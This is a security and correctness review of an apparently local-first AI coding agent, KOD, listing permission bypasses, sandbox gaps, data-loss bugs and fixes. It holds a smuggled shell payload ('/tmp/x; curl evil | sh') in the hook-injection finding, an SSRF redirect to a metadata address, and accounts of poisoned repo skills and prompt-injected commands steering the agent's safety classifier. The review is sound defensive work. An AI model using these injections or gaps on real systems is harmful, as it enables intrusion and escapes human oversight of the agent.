# KOD — Production-Readiness Deep-Dive Review

**Scope:** Full workspace dump — 160 files, ~87,000 lines, 15 crates (`kod` v0.1.0, edition 2024)
**Review date:** 2026-09-19
**Method:** 13 parallel deep-dive passes over every crate, CI, docs, and scripts; all Critical/High findings re-verified against source before publication. Line numbers are approximate (±3 lines) in-file references.
**Verdict counts:** **4 Critical · 53 High · ~130 Medium · ~100 Low**, plus 10 systemic root-cause patterns and a prioritized remediation roadmap.

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [P0 — Critical (fix before any production use)](#2-p0--critical)
3. [P1 — High severity](#3-p1--high-severity)
   - 3.1 [Security & permission integrity](#31-security--permission-integrity)
   - 3.2 [Data integrity & correctness](#32-data-integrity--correctness)
   - 3.3 [Agent-loop & engine correctness](#33-agent-loop--engine-correctness)
   - 3.4 [Concurrency, protocol & resource safety](#34-concurrency-protocol--resource-safety)
   - 3.5 [Providers (LLM wire layer)](#35-providers-llm-wire-layer)
   - 3.6 [TUI](#36-tui)
   - 3.7 [CLI, CI & release pipeline](#37-cli-ci--release-pipeline)
4. [P2 — Medium severity (condensed)](#4-p2--medium-severity-condensed)
5. [Systemic root-cause patterns](#5-systemic-root-cause-patterns)
6. [Missing features & production gaps](#6-missing-features--production-gaps)
7. [Documentation drift](#7-documentation-drift)
8. [What is genuinely done well](#8-what-is-genuinely-done-well)
9. [Prioritized remediation roadmap](#9-prioritized-remediation-roadmap)

---

## 1. Executive Summary

KOD is an ambitious, well-architected local-first AI coding agent: 15 focused crates, streaming agentic loop, multi-provider support, memory, skills, swarm, sandboxing, TUI + CLI + daemon + ACP bridge. The codebase is in the **top tier of hobby/pre-production Rust projects I have reviewed for comment discipline, test culture (~1,500+ test attributes), lock discipline, and honest self-documentation**. Panic hygiene in production paths is excellent, redb transaction handling is exemplary, and the CI design is unusually thoughtful.

It is **not production-ready yet**. The blocking issues are not architectural — they are concentrated in five areas:

1. **The permission system has holes in exactly the wrong places.** The policy engine is not installed on `kod prompt`, `kod run`, `kod swarm`, or `kod replay --execute` (the engine falls back to *Allow-all*), and the engine's own parallel read-only tool round skips policy denials entirely. Meanwhile hooks splice model-controlled arguments into `sh -c`. The CHANGELOG's "default policy preset is standard (writes require approval)" is not currently true on four mainline entry points.
2. **A flagship feature is silently dead.** Semantic memory can never activate: the embedder's dimension cache is only warmed inside `embed()`, and every `embed()` call is gated on `dims() > 0`. No code path ever writes `metadata.embedding`. Configuring `embedding_endpoint = "ollama"` changes nothing, with zero warnings.
3. **Data-loss paths in swarm/worktree and memory.** A conflicted swarm merge force-deletes the branches holding unmerged agent work (via `Drop`), pool-dispatch shares one transcript key across concurrently running agents (one agent's failure cancels and wipes its peer), and memory retrieval write-back can resurrect entries that consolidation just deleted.
4. **A family of byte-slicing bugs that panic on non-ASCII input** (~12 sites: `&s[..300]`, `b as char`) — including in error-classification and streaming paths. For a tool that edits code in any language, every one of these is a crash waiting for a CJK character.
5. **The OpenAI-compatible provider flattens native tool calls to text**, breaking the function-calling round-trip the whole agent loop depends on; Anthropic's SSE decoder corrupts multi-byte characters split across TCP chunks.

None of these require re-architecture. The fixes are mostly local, mechanical, and in several cases already half-present (the excellent-but-unused `retry.rs`, the existing `cap_rendered_result`, the canonicalizing `ToolContext::resolve_path` the policy engine should share). Section 9 sequences the work into five sprints; the P0 set is roughly one focused week.

**Aggregate distribution by crate:**

| Slice | Critical | High | Medium | Low |
|---|---|---|---|---|
| kod-cli (commands.rs ~7.1k lines) | 1 | 6 | 8 | 15 |
| kod-config | — | 3 | 6 | 5 |
| kod-core engine.rs (~10.7k lines) | 1 | 4 | 15 | 10 |
| kod-core rest (serve/router/swarm_runner/worktree/hooks/repomap…) | — | 4 | 16 | 8 |
| kod-core acp/budget/checkpoint/doctor/citations | — | 2 | 8 | 12 |
| kod-memory | 1 | 3 | 11 | 8 |
| kod-provider{,-openai,-anthropic} | — | 5 | 11 | 6 |
| kod-tools (sandbox/tools/web/patch) | — | 6 | 14 | 13 |
| kod-skills + kod-swarm | — | 3 | 8 | 6 |
| kod-tui (app + main_loop + ui) | — | 8 | 12 | 12 |
| kod-error / kod-lsp / kod-mcp / kod-types | — | 4 | 8 | 12 |
| Docs / CI / tooling | — | 5 | 7 | 6 |

---

## 2. P0 — Critical

These four must be fixed before the tool is trusted with a real repository.

### P0-1 · Policy engine never installed on four mainline commands → all tool calls allowed

**Where:** `crates/kod-cli/src/commands.rs` — `run_prompt` (~4844), `run_streaming_prompt`/`kod run` (~5625), `run_swarm` (~1852), `run_replay --execute` (~2490); fallback confirmed at `kod-core/src/engine.rs` (`None => PolicyDecision { outcome: Allow, rule: "no policy installed" }`).

`install_policy_async` is called at exactly three sites (`run_chat`, `run_agent`, `run_acp`). The other four engine-building commands never install a policy, and the engine's fallback is allow-everything — with a comment asserting "the CLI and TUI always install a PolicyEngine", which is false. Consequence: the `standard` preset's write-approval, `.kod/policy.toml`, and session deny rules are **silently bypassed** on one-shot prompts, scripted runs, swarms, and replays. The model can `write_file` / `execute_command` with zero gating.

**Fix:**
- Call `install_policy_async(&engine, &config, cli_preset.as_deref())` in all four commands.
- Root-cause fix: extract one `engine_from_config(config, preset, model) -> Result<Arc<KodEngine>>` helper used by *every* command (see Pattern S10 — the ~180-line bootstrap duplication is the reason this bug exists).
- Add a test asserting `engine.policy().await.is_some()` for every command that constructs an engine.

### P0-2 · Parallel read-only tool rounds skip the denial gate (permission bypass inside the engine)

**Where:** `kod-core/src/engine.rs`, `run_tool_calls` (~24809–24823).

The serial (mutating) branch honors `denied`/`hook_denied`. The all-read-only parallel branch maps **every** call straight to `execute_tool` and never consults either map. A policy- or user-denied read-only call (grep, web_fetch, `read_file` on a denied path, or any `Ask`-gated tool the user explicitly denies) is **executed anyway** whenever the round happens to contain no mutating calls. Hook denials accidentally escape because they force the mutating path; policy denials do not.

**Fix:** In the parallel branch, partition first: build futures only for indices not in `denied`/`hook_denied`, and push `ToolResult::Error("denied: …")` placeholders for denied indices so result order stays aligned. Add a regression test: policy denies `grep` → read-only round → result must be an error, not grep output.

### P0-3 · Semantic memory is completely dead — circular gate means it can never activate

**Where:** `kod-memory/src/manager.rs:324–343` (retrieval), `embedding.rs:101–144` (both embedders), `manager.rs:133–156` (`rebuild_index`).

Three independent facts compose the bug:

1. `OllamaEmbedder`/`OpenAIEmbedder.dims()` returns a cache that is only stored **inside** a successful `embed()` call ("Cached dims from the first successful call. 0 means unknown.").
2. Every production `embed()` call site (query embed at `manager.rs:342`, `fuse_duplicates` at `:44132`, `rebuild_index`) is gated on `dims() > 0` / `semantic_available`.
3. `rebuild_index` only inserts vectors from `entry.metadata.embedding`, and **no code path in the workspace ever writes that field**.

Therefore `dims()` can never transition 0 → N: the cache warm-up is circular. Configuring `memory.embedding_endpoint = "ollama"` yields: no query embedding, an empty vector index forever, fusion never runs, `embedder_name()` permanently reports `"unusable"`, and the 0.6-weight semantic component of the hybrid scorer never fires — all silently, with zero log lines.

**Fix:**
- Warm the cache: when `dims() == 0`, attempt one probe embed (of the query itself) and treat `Ok` as semantic-available; log the discovered dimension.
- Persist embeddings on the write path (`store_with_metadata`), or embed un-vectorized entries inside `rebuild_index`.
- Add an integration test asserting a configured embedder produces non-zero cosines end-to-end. Also fix the default `embedding_model = "all-MiniLM-L6-v2"` — it is not a valid Ollama model name and would 404 once the path is revived.

### P0-4 · Hooks splice model-controlled arguments into `sh -c` — injection into the security layer itself, with no timeout

**Where:** `kod-core/src/hooks.rs:133,150`.

`substitute` interpolates tool arguments (`{path}`, `{content}`, …) verbatim into the hook command string, executed via `sh -c`. A model (or a poisoned skill instructing it) producing `path = "/tmp/x; curl evil | sh"` executes arbitrary commands **outside** the tool sandbox and the policy engine — hooks are the mechanism meant to *enforce* policy, and they are themselves an injection vector. Additionally: `run_shell` has no timeout (one hanging hook stalls the whole tool-call path, sequentially per matching hook), and captured stdout/stderr are unbounded and embedded verbatim into `PermissionDenied` errors.

**Fix:**
- Pass values as environment variables or argv instead of text substitution: template becomes `rustfmt "$KOD_PATH"` and the runner sets `KOD_PATH` per substitution. This removes the injection class entirely.
- Wrap hook execution in `tokio::time::timeout` (e.g. 30s, configurable); kill on expiry.
- Truncate captured output before logging; document that hook *templates* are config-trusted but *arguments* are not.

---

## 3. P1 — High severity

### 3.1 Security & permission integrity

#### H-S1 · `kod replay --execute` re-runs recorded tool calls with no approval gate

`commands.rs:2490–2589` builds a bare engine (`enable_memory: false`, no policy) and calls `engine.run_tool(name, args)` per recorded entry. Verified: `KodEngine::run_tool` bypasses the policy path entirely (policy is only enforced in `run_tool_calls`). A session log on disk — possibly from another project or tampered — is effectively an executable command script; recorded `execute_command` entries run for real, unconfirmed.
**Fix:** Install a read-only policy; surface `RequiresConfirmation` as a y/N prompt; refuse `execute_command` entries without an explicit `--i-know-this-runs-shell` flag; print a summary of destructive calls before starting.

#### H-S2 · Untrusted project `.kod/policy.toml` can silently *escalate* permissions

`kod-config/src/policy.rs:261–279` auto-merges the cloned repo's `.kod/policy.toml` as layer 3. A repo shipping `preset = "yolo"` or `[tools.write_file] mode = "allow"` widens the effective policy past the user's global `standard` with no consent gate or notice. An `.editorconfig`-style file should not be able to grant shell-exec rights.
**Fix:** Let the project layer only *narrow* (intersect), or require direnv-style first-seen consent persisted by repo-path hash; at minimum print a prominent banner when the project layer widens anything.

#### H-S3 · Policy path resolution diverges from tool path resolution → allowlist/forbidden bypass

`policy.rs:526–533` resolves paths lexically (`working_dir.join(p)`, no `..` normalization, no symlink handling), while the tools canonicalize the same argument via `ToolContext::resolve_path`. Two bypasses: (1) `path = "src/../secrets/x"` matches a `src/**` allowlist lexically while the tool writes `<wd>/secrets/x`; (2) an in-root symlink pointing at `.env` never matches forbidden `**/.env` because the policy sees only the link name.
**Fix:** Mirror `ToolContext::resolve_path` semantics in the policy engine — lexical `..` normalization always, best-effort canonicalization (canonical parent + file name) before glob matching. Share one helper crate-side; the two implementations deciding on *different paths* is the root defect.

#### H-S4 · `jev.api_key` stored plaintext in config and printed by `kod config show-merged` / `export`

`kod-config/src/jev.rs:30` keeps a raw `Option<String>` while the rest of the codebase correctly uses `api_key_env` indirection. `show_merged`/`export` serialize the whole config verbatim — no redaction — so the key lands in terminal scrollback and export files.
**Fix:** Drop the inline key (resolve `TYPESAFE_API_KEY` env only); if an inline key must be supported, redact it in show/export/`Debug` and `chmod 600` the config file. Related: `config.rs:255–269` `save_to` is non-atomic (no tmp+rename, no fsync, no 0600).

#### H-S5 · `execute_command` inherits the full process environment — secrets reachable inside the sandbox

`kod-tools/src/tools.rs:500–507` spawns `sh -c` (and the sandbox wrappers) with kod's entire env. `ANTHROPIC_API_KEY`, Jev keys, daemon tokens are all visible via `env` / `/proc/self/environ` inside the sandbox. bubblewrap does not clear the environment; combined with the Landlock `net_deny` placebo (H-S8) this is an exfiltration path.
**Fix:** Default to a minimal env (`PATH`, `HOME`, `TMPDIR`, `LANG`, proxy vars) with an explicit opt-in passthrough list; at minimum strip known secret-shaped variables.

#### H-S6 · `execute_command` ignores `context.working_dir`

`tools.rs:500–507` never sets `.current_dir()`. Verified: only git.rs and check.rs use `current_dir`. In `Disabled` mode the command runs in kod's process cwd; the Landlock launcher inherits the parent's cwd; only bwrap's `--chdir` is correct. Model commands silently operate on the wrong tree (e.g. a daemon started in `$HOME`).
**Fix:** `.current_dir(&context.working_dir)` on every backend; for the Landlock launcher pass a workdir; for Seatbelt wrap with `sh -c 'cd <wd> && cmd'`.

#### H-S7 · SSRF via redirects and DNS rebinding in `web_fetch`

`kod-tools/src/web.rs:195` validates the initial URL (host + all resolved IPs) but the client uses reqwest's default redirect policy (10 hops) with **no per-hop revalidation** — `http://attacker/r` → 302 → `http://169.254.169.254/latest/meta-data/` is fetched and returned to the model. Separately (`web.rs:170–195`), the DNS check resolves once and reqwest resolves again — a TTL-0 attacker DNS answers the check with a public IP and the fetch with `127.0.0.1`.
**Fix:** `Policy::custom` redirect handler re-running the private-IP check per hop (or `Policy::none()`); resolve once, validate, and pin the connection to the validated address (reqwest `resolve()`).

#### H-S8 · Sandbox guarantees asserted but not enforced: `.git` RO and Landlock `net_deny` are placebos

Two findings from `kod-tools/src/context.rs` + `sandbox/landlock.rs`:
- **bwrap mount order:** `.git` is RO-bound *before* the parent RW bind; the later RW mount covers it → `.git` is writable. The code's own comment states the correct rule ("mount it RO *after* the workspace bind — order matters"). Landlock rules are additive, so the `.git` RO rule can never subtract from the `wd` RW rule — only Seatbelt enforces it. The `git_commit` safety story ("shell can't touch `.git` because the sandbox mounts it RO") is false on Linux and whenever `SandboxMode::Disabled`.
- **Landlock network:** `apply()` refuses to run when `net_deny && abi < 4`, implying network denial on ABI ≥ 4 — but `LANDLOCK_ACCESS_NET_*` / `LANDLOCK_RULE_NET_PORT` appear nowhere in the codebase. On a 6.7+ kernel the sandbox "succeeds" with unrestricted network.
**Fix:** Reorder bwrap args; replace the single `wd` RW Landlock rule with per-child rules excluding `.git`; on ABI ≥ 4 set `handled_access_net = BIND|CONNECT` with no net-port rules (denies all connect/bind). Until enforced, document `.git` RO as bwrap/Seatbelt-only.

#### H-S9 · Skills: no trust boundary for repo-supplied prompt injection

`kod-skills/src/loader.rs:51609` + `kod-config/skills.rs`: skills auto-load from `cwd/.kod/skills` and `cwd/.agents/skills` (any cloned repo) and their `instructions` are injected verbatim into the system prompt, uncapped, with no consent gate, no per-skill enable/disable, no provenance. A malicious repo skill is a direct, unbounded prompt-injection channel — same trust class as H-S2.
**Fix:** First-use opt-in for project-local skills (mirroring the policy-consent pattern); per-skill `enabled` flag + `kod skills` management UX; cap `instructions` bytes even when no budget is configured; surface provenance in the prompt.

#### H-S10 · Skills hot-reload wipes every other directory's skills

`kod-skills/matcher.rs:52180` + `kod-core/router.rs` + `commands.rs:3264–3274`: the CLI calls `enable_hot_reload(dir)` in a loop over all four skills dirs, but `Router::enable_hot_reload` is idempotence-guarded — only the **first** dir is watched. Worse, `replace_all` rebuilds the matcher from the *single* watched dir, so an edit in `~/.kod/skills` silently drops every project-local skill until restart, and project-local edits never trigger reload at all.
**Fix:** Watch all dirs (one watcher each); the reload handler must rebuild via `load_from_dirs(&all_dirs)` — the same shadowing entry point as initial load — or upsert/remove per affected dir.

#### H-S11 · Skill matcher threshold default (0.7) contradicts the matcher's calibrated scale (0.3) — and is unvalidated

`kod-config/skills.rs:12815` ships `match_threshold = 0.7`; `SkillMatcher::new()` uses `min_score: 0.3` and its scoring tests pin that scale (tag 0.4, capability 0.3, description ≤ 0.2, trigger 0.8, name 0.9). At 0.7, tag-only/capability-only/description-only matches can *never* surface. No clamp anywhere: `match_threshold = 70` (user thinking in percent) ⇒ nothing ever matches, silently; NaN ⇒ nothing.
**Fix:** Validate/clamp to `0.0..=1.0` at config load (reject NaN), align the default with the matcher's design point, document the scale on the config field.

#### H-S12 · Cross-project memory leakage — `project_key` never consulted at retrieval

`kod-memory/src/manager.rs:316–393`: entries are written with `project_key`, and fusion groups by it — but retrieval doesn't: no project parameter, keyword scoring covers every entry, vector search passes the no-op predicate `|_| true`. With the default global scope, facts learned in project A (preferences, decisions, potentially extracted secrets) are injected into project B's prompts. Three doc comments claim this filtering exists.
**Fix:** Thread `project_key: Option<&str>` through `retrieve_context`/`retrieve_long_term_hybrid`/`search_long_term`; filter before scoring; pass a real `keep` predicate to `idx.search`.

#### H-S13 · Sandbox mode can be downgraded per-command by a second LLM on model-authored text

`kod-core/src/engine.rs:19618–19621`: in `Auto` mode a Jev verdict of `safe`/`network_risk` maps to `SandboxMode::Disabled` for that command — and the classifier's input is the model-authored command text itself, so a prompt-injected payload can steer its own unsandboxed execution. Same shape for `auto_approve_with_jev` (`engine.rs:21783–22207`): Jev auto-approves `Ask`-gated calls based on model-authored args.
**Fix:** Restrict Jev auto-approval to a static allowlist of tool+arg shapes; never auto-approve `execute_command`; only allow the sandbox downgrade when the command also matches a conservative static allowlist (no redirection, no `rm`/`curl|sh` shapes). Decisions are audit-logged — good — but the default posture should be fail-closed.

#### H-S14 · Insecure sandbox profile tempfile

`kod-tools/src/context.rs:203–272` writes the landlock profile to a guessable `/tmp/kod-sandbox-<pid>.json`, world-readable (0644), symlink-following, never cleaned if the spawn fails. Leaks workspace paths; classic insecure-tempfile pattern.
**Fix:** `tempfile::NamedTempFile` (O_EXCL, 0600, random name); delete on error paths.

#### H-S15 · `.git/**` writable via `write_file`/`patch_file`

`kod-tools/src/tools.rs:355–378`: `can_write` checks bitmask + allow/forbid globs + swarm claims only. With defaults, `.git/config`, `.git/refs/heads/main`, `.git/hooks/pre-commit` are writable, bypassing the "git mutations require the git tool + approval" design that only gates the shell path.
**Fix:** Hard-deny `.git/` (and consider `.kod/`) inside `can_write` unless an explicit permission flag is set.

---

### 3.2 Data integrity & correctness

#### H-D1 · Swarm pool dispatch shares one transcript key across concurrently running agents

`kod-core/src/swarm_runner.rs:484,733,930`: the capability pool assigns every subtask of one capability the same `AgentId` and the same `transcript_key = "swarm:{id}"`, then dispatches one async block **per subtask** concurrently via `join_all`. Two agents interleave into one engine transcript; worse, one agent's failure path calls `request_cancel_for(key)` (cancels its running peer) and `forget_transcript(key)` (wipes the peer's history mid-flight). The decompose-fallback path always produces a 1-agent pool, so this is the *default* behavior whenever the model replies malformed.
**Fix:** Spawn one task per *agent* (queue subtasks through the coordinator), or key transcripts per `(agent, subtask)`; never share a transcript key between concurrently-running loops; scope cancel/forget to the subtask.

#### H-D2 · Conflicted/failed swarm merge force-deletes unmerged agent work via `Drop`

`kod-core/src/worktree.rs:333` + `swarm_runner.rs:1031`: `WorktreeManager::drop` runs `git worktree remove --force` and **`git branch -D <branch>`** for every created worktree. `run()` drops the manager on the conflict path — where `merge_all()` aborted the merge and the report was returned "for the caller to decide". By the time the caller sees `conflicted`, the branches carrying committed-but-unmerged agent work are gone. Process death mid-swarm also skips `Drop` entirely (leaked worktrees, no GC command).
**Fix:** Only auto-clean branches that merged cleanly (or after explicit ack); on conflict/failed leave worktrees+branches and add `kod worktree gc`. Never `branch -D` unmerged refs without a flag.

#### H-D3 · Swarm merge runs into unverified HEAD; conflict detection defeated by worktree paths

- `worktree.rs:204`: `merge_all` runs `git merge --no-ff` in the repo's *current* checkout without verifying HEAD is still the base commit or the index clean (a 30-minute swarm; the user may switch branches; the runner itself mutates `.gitignore`). Conflict detection depends on git stderr containing the substring "conflict".
- `swarm_runner.rs:1567`: `collect_writes` buckets by canonical absolute path; in worktree mode two agents editing the *same logical file* record different paths → no `ConflictDetected` event, and the merge prompt is never told.
**Fix:** Verify `rev-parse HEAD == base_commit` and clean index before merging; use exit code + `diff --diff-filter=U` instead of stderr text; normalize write paths relative to the transcript working dir before bucketing.

#### H-D4 · Memory: no dedup, no size cap, no TTL → unbounded global DB growth, re-scanned every prompt

`kod-memory/src/manager.rs:167–217`: every `store` mints a fresh `MemoryId`; identical content persists N times. `memory_save` is model-invocable with no dedup/rate-limit/content cap (validation is "must not be empty"). LongTerm entries have no TTL/decay (only Episodic archives). Retrieval then does `get_all()` — full-table scan + JSON deserialization of every entry — on **every prompt**, then tokenizes every entry twice (df pass + BM25 pass), with a linear ~250-word stopword scan per token. At ~10k entries this is hundreds of ms per prompt; the store never shrinks and there is no vacuum.
**Fix:** Content-hash secondary index → upsert; cap content length (e.g. 4 KiB) at store; keyword-only fusion (token Jaccard) as embedder-less fallback; cache tokens/df incrementally (store a content hash, invalidate on write); `OnceLock<HashSet>` for stopwords; add LongTerm TTL driven by `last_retrieved_at_ms`; document an export→rebuild compaction path.

#### H-D5 · Memory retrieval write-back resurrects entries deleted by consolidation (stale-snapshot lost update)

`manager.rs:395–412`: retrieval snapshots via `get_all`, then `store_batch(updated)` re-inserts **whole stale entries**. The hourly consolidation (archive/fuse) runs concurrently at the same await points; if an archived/duplicated entry is in the top-k snapshot, the write-back re-inserts it verbatim — undoing garbage collection and reverting tag merges. redb has no CAS.
**Fix:** Write back only a touch-timestamp via a dedicated side table (`id → last_retrieved_ms`), or re-`get` each id inside the write txn and skip entries that changed/vanished.

#### H-D6 · Short-term memory: lock-order inversion (latent deadlock) and `update()` duplicates entries

`kod-memory/src/short_term.rs:29–43 vs 89–107`: `store` takes `entries`→`index`; `remove` takes `index`→`entries`. Two concurrent callers deadlock (parking_lot has no detection). Today `remove` is unreachable in prod — latent. Separately, `manager.update` on ShortTerm get→mutate→`store` pushes a **second** copy of the same id (store never checks existence), corrupting the index and leaving a stale twin unremovable.
**Fix:** Merge into one `Mutex<ShortTermState>` (the two-lock split buys nothing), or enforce a single documented order; make `store` replace-in-place when the id exists.

#### H-D7 · Checkpoint IDs overflow their zero-padded field after 9,999 snapshots — retention then deletes the *newest*

`kod-core/src/checkpoint.rs:168`: `id = format!("{ts_ms:013}-{n:04}")` with an in-process `AtomicU64`. After 10k snapshots in a long-lived daemon, `n` renders 5 digits, which sorts *before* `9999` lexicographically; `list()` ("newest first") inverts and `enforce_retention` (drop lexicographically smallest) starts deleting the newest snapshots. The module doc explicitly relies on lexicographic = chronological. Also: the counter resets per process, so two concurrent kod processes in the same millisecond collide and silently overwrite; and `find(id)` joins `../../x`-style ids into the directory path unvalidated.
**Fix:** Widen the counter (`{n:010}`) or sort numerically by `(taken_at_ms, n)`; mix a process-unique component into the id; validate ids against `^\d{13}-\d+$`.

#### H-D8 · Checkpoint restore is not itself checkpointed; size cap checked after full read

- `checkpoint.rs:238–259`: `restore()` overwrites the current file without first snapshotting it — a mistaken restore (ids are opaque timestamps) destroys the current version permanently; the `existed=false` restore deletes a file the user may have deliberately modified.
- `checkpoint.rs:136–160`: `snapshot_before` does `read_to_string` *before* comparing `content.len() > MAX_SNAPSHOT_BYTES` — a multi-GB log is fully read and UTF-8-validated just to be rejected.
**Fix:** Snapshot before restore (retention already exists); `fs::metadata().len()` check before opening; handle `IsADirectory`.

#### H-D9 · Config: one bad field in one endpoint silently discards the *entire* user config

`kod-config/src/config.rs:201–214` + `llm.rs:322–341`: `EndpointConfig` requires `context_window` (no serde default) among other fields; any hand-edit mistake fails whole-file parse and `load_default`'s only recovery is "fall back to `Self::default()`" with a `tracing::warn!` that may be emitted before any subscriber exists. All endpoints, hooks, policy preset, and memory settings are replaced by defaults — the user may silently start sending prompts to `localhost:11434` with `codellama:13b`.
**Fix:** Per-section recovery (parse into `toml::Table`, deserialize sections independently, keep good ones); `#[serde(default)]` on `context_window`; print an eprintln banner (not just tracing) on fallback; stash the rejected file as `config.toml.broken`.

#### H-D10 · Whole-transcript session-log writes are not atomic append; truncated last line is fatal; no rotation

`kod-core/src/session_log.rs:208,277`: `writeln!` on a raw file issues multiple `write` syscalls (payload, newline) — O_APPEND atomicity is per-syscall, so two recorders on the same path (explicitly supported) can interleave fragments and corrupt a line; `read_session` then hard-fails the whole file. A crash-truncated final line — the exact case per-line flushing exists to survive — is treated as fatal corruption. Files accumulate forever; `read_session` slurps whole files.
**Fix:** Build the full line (with `\n`) into one buffer and issue a single `write_all` under the mutex; tolerate an incomplete final line (warn + drop); stream the reader line-by-line; add a retention/prune command.

---

### 3.3 Agent-loop & engine correctness

#### H-E1 · Auto-check/LSP early-returns drop the round's structured transcript — the model never learns the write outcome

`kod-core/src/engine.rs:25138–25192`: four early `return ToolRound { …, messages: Vec::new() }` paths fire when a write happened and (a) LSP returned empty with `auto_check` off, or (b) the compiler check errored. Under the **default config** (`auto_lsp = true`, `auto_check = false`) with no LSP server, *every successful write round* takes path (a): the assistant tool-call message and tool-result messages are never constructed, so the next round's request contains no tool results. The model doesn't know whether its write succeeded and will re-write or hallucinate. History persistence (`if !section.messages.is_empty()`) also skips.
**Fix:** Build `messages` unconditionally before the auto-check block and return it from all paths; only the diagnostics *block* should be conditional. Test: `round.messages` non-empty for a write round under default flags with no LSP server.

#### H-E2 · Structured tool messages carry full, uncapped tool-result JSON — unbounded context growth

`engine.rs:25381–25388`: the text prompt block caps each rendered result at 8,000 bytes (`cap_rendered_result`), but the `Role::Tool` messages placed on the wire use raw `ToolResult` JSON, uncapped. A `read_file` returning up to 256 KB, repeated over up to 40 rounds and persisted into history, produces unbounded transcripts. No token counting, no compaction trigger; the eventual provider "context length exceeded" error is non-retryable and kills the turn.
**Fix:** Run tool messages through a cap (the same helper, larger budget); estimate tokens before each `complete()`; trigger summarization/compaction when projected size approaches the endpoint window.

#### H-E3 · Prompt budget does not cover what is actually sent; allocation reads the wrong endpoint from disk every call

Two compounding findings (`kod-core/src/budget.rs:93–114`, `engine.rs:22149–22167`):
- `allocate()` budgets request/history/skills/memory/repomap, but the engine then appends *outside* the budget: the `## Environment`/`## Tool use` trailer, the structured system prompt, tool JSON schemas, and per-round tool results across up to 40 rounds. The budget's core invariant holds over the wrong denominator.
- `prompt_allocation` calls `KodConfig::load_default()` (file I/O + TOML parse) on **every** prompt and uses the config-file's default endpoint — not the active `ModelRef` — so after `/model` switches to a smaller-window endpoint, budgets still reflect the config default (and swarm agents on small models are budgeted against the wrong window).
**Fix:** Measure system-prompt + tool-schema overhead once per turn and subtract in `allocate`; re-check before each round with accumulated tool results. Pass the effective endpoint's `context_window`/`max_tokens` into `prompt_allocation`; drop the per-call disk read.

#### H-E4 · `expand_at_references` corrupts all non-ASCII input (mojibake on every prompt)

`engine.rs:18062`: the byte loop pushes `bytes[i] as char` — a Latin-1 numeric cast for bytes ≥ 0x80. "é" becomes "Ã©"; CJK/emoji input is destroyed on every prompt that doesn't fully match an `@ref`. The adjacent comment claims the opposite ("Multi-byte UTF-8 preserves…"), and the test suite has zero non-ASCII cases for this function, so CI cannot see it.
**Fix:** Iterate `char_indices()` and push `ch` directly; add a test with `"café résumé 你好 @foo.rs"` asserting identity for non-ref text. (Same `as char` family exists at `kod-tools/src/web.rs:63850` — see H-W2.)

#### H-E5 · Non-streaming path never sets `current_request`; quality gate reads it after clearing it

`engine.rs:22700, 22974–22983`: `process_for` never calls `set_current_request` (only the two streaming entry points do), so every request-keyed Jev helper silently no-ops or uses a stale request in the collected path. Worse, `clear_current_request` runs *before* `current_request(key)` — the P5.4 quality gate always evaluates against an empty request: a wasted Jev round-trip per turn producing meaningless advisories. The field doc claims both entry points set it.
**Fix:** Set at the top of `process_for`; move the clear after the quality gate; extract the shared turn-preparation preamble (see Pattern S9) so the three entry points cannot drift again.

#### H-E6 · Token accounting keeps only the last round's usage; summary usage discarded

`engine.rs:23674/23695, 23912, 24132`: every loop uses `last_usage = usage.or(last_usage)` — over an N-round turn, rounds 1..N−1 (typically the bulk of prompt tokens) are dropped from `TaskResponse::usage` and the session-log `Cost` entry. `stream_summary` explicitly ignores `StreamChunk::Usage`; the collected summary path returns only a `String`, so summary tokens are never counted. Cost display is systematically wrong.
**Fix:** Add a `TokenUsage` merge (sum prompt/completion, max cached fields) and accumulate across rounds/turns; capture usage from the summary call.

#### H-E7 · History cap counts *messages*, not turns, and loop-path eviction ignores pinned turns

`engine.rs:23722–23725, 23962–23965 vs 25864–25872`: the doc says "last turns" but the cap applies to the flat message vector — a single agentic turn with 10 tool calls appends ~21 messages, so 40 messages ≈ 2 agentic turns before draining. The loops evict with `turns.drain(..excess)` (ignores `metadata.pinned`), while `record_turn_for` uses pinned-aware `retain` — a user-pinned turn is silently destroyed by tool-round persistence. `compact_history_for` has the same pinned-blindness.
**Fix:** One `cap_transcript(turns, pinned_aware: bool)` helper for all three sites; either raise the constant to message-aware semantics or count user→assistant groups as turns.

#### H-E8 · Goal loop's outer cancellation check targets the wrong transcript key

`engine.rs:23528`: `process_goal_streaming_for` checks `self.is_cancelled()` (hardwired default key) at each turn boundary, while everything else correctly uses `is_cancelled_for(round.holder)`. A `request_cancel_for("swarm:<agent-id>")` is not observed at the boundary.
**Fix:** `is_cancelled_for(key)`.

#### H-E9 · Round-cap exit note inconsistent between paths; summary not steered in the collected path

`engine.rs:23963–23965, 23900 vs 25864–25872`: on hitting the round cap, the streaming path builds the summary from `pending` (which contains the exhaustion note); the collected path deliberately discards `attempt_pending` and summarizes from the original `convo` — the note (whose own doc says "this note is what steers that summary") and the loop's intermediate text are lost.
**Fix:** Build the summary prompt from the winning attempt's `attempt_pending` in both paths.

#### H-E10 · `futures::executor::block_on` on a tokio `RwLock` inside the async runtime

`engine.rs:25741, 25757, 25872`: `request_cancel_for`/`clear_cancel_for`/`is_cancelled_for` are sync fns falling back to `block_on(lock.write()/read())`. `is_cancelled_for` runs on the hot path of every agentic round; on a current-thread runtime or saturated pool this is a deadlock/livelock hazard.
**Fix:** Switch `cancels` to `std::sync::RwLock<HashSet<String>>` (never held across await) or per-key atomic flags.

#### H-E11 · No provider-stream deadline, no within-endpoint retry, and mid-stream errors discard partial state

`engine.rs:24058–24300`: `while let Some(item) = stream.next().await` has no deadline — a wedged SSE connection hangs the turn indefinitely. The fallback chain retries only `is_retryable()` errors *across* endpoints: a single-endpoint config has zero resilience, and no config ever retries the same endpoint with backoff. On stream error mid-tool-call, `item?` discards assembled partials and the round's streamed text; the transcript shows a user turn with no assistant turn after a hard failure.
**Fix:** Wrap the stream in a global per-round deadline + idle-chunk timeout; add bounded exponential backoff on `is_retryable()` before advancing the chain (the existing `kod-provider/src/retry.rs` is exactly this — see H-P3); on stream error, still assemble partials as `ToolResult::Error("stream interrupted…")` messages and return the partial text with the error.

#### H-E12 · Jev memory filter contradicts its own keep-original comment → prompt starvation

`engine.rs:21484–21488`: doc and comment say an over-eager filter that drops everything should keep the original; the code `return Vec::new()`. The caller then `retain`s against an empty keep-set → both working and long-term memory emptied whenever Jev scores every entry below threshold. Related: `classify_new_diagnostics_with_jev` (`20228–20241`) builds `truly_new` only from returned rows, so a batch answering 1 of 10 hides 9 genuinely-new compiler errors (fail-closed where fail-open is documented).
